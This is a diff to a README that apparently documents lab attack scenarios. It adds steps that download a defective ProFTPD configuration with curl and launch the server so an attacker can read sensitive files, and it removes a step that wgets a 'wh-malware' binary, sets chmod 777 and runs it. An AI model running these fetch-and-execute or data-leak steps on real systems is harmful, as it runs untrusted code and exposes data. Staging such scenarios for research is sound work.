@@ -50,26 +50,21 @@ sudo /home/chuqi/local/proftpd/sbin/proftpd -c /path/to/configure/file
 1. Download different configuration files (including the defective configuration file) via curl
 
 ```
-/home/chuqi/local/nginx/sbin/nginx
+/home/chuqi/local/curl/bin/curl -o mal-proftpd.conf -L https://raw.githubusercontent.com/Icegrave0391/attack-scenarios/main/configuration-based-ftp-leak/mal-proftpd.conf -o conf1.conf -L https://raw.githubusercontent.com/Icegrave0391/attack-scenarios/main/configuration-based-ftp-leak/conf1.conf -o conf2.conf -L https://raw.githubusercontent.com/Icegrave0391/attack-scenarios/main/configuration-based-ftp-leak/conf2.conf
 ```
 
-1. Download several packages via wget 
-```
-wget https://github.com/Icegrave0391/attack-scenarios/releases/download/v0.1-watering-hole/wh-malware https://github.com/Icegrave0391/attack-scenarios/releases/download/v0.1-watering-hole/wh-pkg1 https://github.com/Icegrave0391/attack-scenarios/releases/download/v0.1-watering-hole/wh-pkg2
-
-chmod 777 wh-*
-```
-2. Execute `wh-malware`
+2. Deploy FTP server with the defective configuration file
 
 ```
-./wh-malware
+sudo /home/chuqi/local/proftpd/sbin/proftpd -c mal-proftpd.conf
 ```
 
 **Exploit (Attacker IP2)**    
 
-Access victim's web-server on attacker's browser:
+Access victim's FTP server and transfer files:
 ```
-IP1:8080/data/xxx
-IP1:8080/images/xxx
+IP1:9021/ftp-sensitive.txt
+IP1:9021/ftp-source/ftp_file1.txt
+...
 ```
 
